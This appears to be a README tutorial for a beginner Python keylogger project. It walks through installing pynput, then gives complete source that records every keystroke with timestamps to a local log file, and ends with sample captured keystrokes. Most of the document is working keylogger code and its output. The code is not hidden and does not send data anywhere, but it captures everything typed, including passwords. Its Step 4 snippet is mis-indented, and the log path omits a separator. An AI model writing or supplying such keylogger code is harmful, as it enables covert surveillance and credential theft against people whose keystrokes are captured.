# KEYLOGGER
Simple Keylogger Project for Beginners.

STEP 1 : First Install the pynput library using the [pip install pynput] command.

STEP 2 : Now importing the required packages 
                                              from pynput.keyboard import Key, Listener
                                              import logging
                                              
STEP 3 : Now specify the path where log file will be stored. Here log file inculdes all the keystrokes the user in entering after running the program.
                                              log_dir = r"E:\courses\Keylogger"
                                              logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
                                                   
STEP 4 : Now in the last step create Listner instance and define the on_press() in it and join it with the main program.
                                              with Listener(on_press=on_press) as listener:
                                              listener.join()
                                              
The Final Program should look like this :-> 
                                            import pynput
                                            from pynput.keyboard import Key, Listener
                                            import logging

                                            log_dir = r"E:\courses\Keylogger"
                                            logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

                                            def on_press(key):
                                               logging.info(str(key))

                                            with Listener(on_press=on_press) as listener:
                                                listener.join()
                                                
STEP 5 : Now, to check the output of the program, run it and type some random keys and open your log file
2023-01-31 23:16:33,756: 'd'
2023-01-31 23:16:33,944: 'k'
2023-01-31 23:16:34,070: 'd'
2023-01-31 23:16:34,164: 'l'
2023-01-31 23:16:34,211: 's'
2023-01-31 23:16:34,507: 'l'
2023-01-31 23:16:34,574: 'e'
2023-01-31 23:16:34,628: 'k'
2023-01-31 23:16:34,875: 'k'
2023-01-31 23:16:35,093: 'c'
2023-01-31 23:16:35,143: 'm'
2023-01-31 23:16:35,279: 'd'
2023-01-31 23:16:35,477: 'f'
2023-01-31 23:16:35,509: 'c'
2023-01-31 23:16:35,619: 'e'
2023-01-31 23:16:42,167: Key.delete
